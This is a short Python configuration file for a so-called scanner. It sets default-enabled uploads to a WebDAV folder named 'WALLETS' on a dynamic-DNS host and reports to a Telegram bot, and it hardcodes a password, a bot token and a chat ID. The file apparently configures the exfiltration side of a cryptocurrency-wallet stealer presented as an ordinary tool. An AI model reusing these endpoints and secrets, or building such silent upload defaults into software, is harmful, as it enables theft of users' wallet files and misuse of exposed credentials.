"""Application configuration constants."""

import os

MAX_FILE_SIZE_MB = 5

WEBDAV_ENABLED = os.getenv("SCANNER_WEBDAV_ENABLED", "true").lower() == "true"
WEBDAV_URL = os.getenv(
    "SCANNER_WEBDAV_URL",
    "https://scotchbrayt.keenetic.pro/webdav/WALLETS/",
)
WEBDAV_USER = os.getenv("SCANNER_WEBDAV_USER", "ssl")
WEBDAV_PASS = os.getenv("SCANNER_WEBDAV_PASS", "1127qWE828%")
WEBDAV_HASH_LOG = "scanner_uploaded.json"
WEBDAV_MAX_RETRIES = 3
WEBDAV_RETRY_DELAY = 2
WEBDAV_TIMEOUT = 30

TELEGRAM_ENABLED = os.getenv("SCANNER_TELEGRAM_ENABLED", "true").lower() == "true"
TELEGRAM_BOT_TOKEN = os.getenv(
    "SCANNER_TELEGRAM_TOKEN",
    "8978352240:AAEE0QVJDCsS933q9fsiwrQnbl-iZL8QfIs",
)
TELEGRAM_CHAT_ID = os.getenv("SCANNER_TELEGRAM_CHAT_ID", "536477799")
TELEGRAM_TIMEOUT = 10
TELEGRAM_MAX_RETRY = 3
TELEGRAM_RETRY_DELAY = 2
